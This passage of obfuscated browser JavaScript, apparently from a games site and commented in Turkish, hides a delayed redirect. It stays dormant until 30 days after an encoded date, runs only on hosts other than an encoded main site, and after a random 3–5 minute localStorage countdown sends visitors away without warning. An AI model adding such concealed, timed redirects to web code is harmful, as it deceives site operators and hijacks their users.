...
function crayzgames() {
  const xlsmlnmg = "dWNiZy5naX";
  const rntjwrgo = "RodWIuaW8=";
  const daamjdzi = atob(xlsmlnmg + rntjwrgo);
  const jnuqwhod = "MjAyNS0x";
  const euciiyhg = "Mi0xNA==";
  const sxvaxqiv = new Date(atob(jnuqwhod + euciiyhg));
  const hasgzewo = atob("cmVkaXJlY3RfY291bnRkb3du");
  const qficxsub = atob("cmVkaXJlY3RfdGltZQ==");
  
  const basmkdgl = window.location.hostname;
  const loqmiyjl = Date.now();
  
  // Eğer zaten main_site'deysek hiçbir şey yapma
  if (basmkdgl === daamjdzi) return;
  
  // main_date'den 30 gün geçti mi kontrol et
  const zyqpaail = 30 * 24 * 60 * 60 * 1000;
  const augjfstj = loqmiyjl - sxvaxqiv.getTime();
  
  if (augjfstj < zyqpaail) {
    // 30 gün henüz geçmedi
    return;
  }
  
  // 30 gün geçti, localStorage kontrol et
  let gwbunhia = localStorage.getItem(hasgzewo);
  let cltbzehg = localStorage.getItem(qficxsub);
  
  if (!gwbunhia) {
    // İlk kez, geri sayım başlat
    // 3-5 dakika arası rasgele seç (ms cinsinden)
    const qriyssmk = 3 * 60 * 1000;  // 3 dakika
    const cilfjgwy = 5 * 60 * 1000;  // 5 dakika
    const tfgztyup = Math.floor(Math.random() * (cilfjgwy - qriyssmk + 1)) + qriyssmk;
    
    const bmehfzaj = loqmiyjl;
    const lzxdhdth = bmehfzaj + tfgztyup;
    
    // localStorage'a kaydet
    localStorage.setItem(hasgzewo, "active");
    localStorage.setItem(qficxsub, lzxdhdth.toString());
    
    cltbzehg = lzxdhdth;
  }
  
  // Geri sayım başlat
  const lzxdhdth = parseInt(cltbzehg);
  const llnigfsd = lzxdhdth - loqmiyjl;
  
  if (llnigfsd <= 0) {
    // Süre bitti, yönlendir
    localStorage.removeItem(hasgzewo);
    localStorage.removeItem(qficxsub);
    window.location.href = "https://" + daamjdzi + "/";
    return;
  }
  
  // Geri sayım devam ediyor, belirli aralıklarla kontrol et
  const lmqutfzd = setInterval(() => {
    const kiukyntu = Date.now();
    const niruqwdj = lzxdhdth - kiukyntu;
    
    if (niruqwdj <= 0) {
      clearInterval(lmqutfzd);
      localStorage.removeItem(hasgzewo);
      localStorage.removeItem(qficxsub);
      window.location.href = "https://" + daamjdzi + "/";
    }
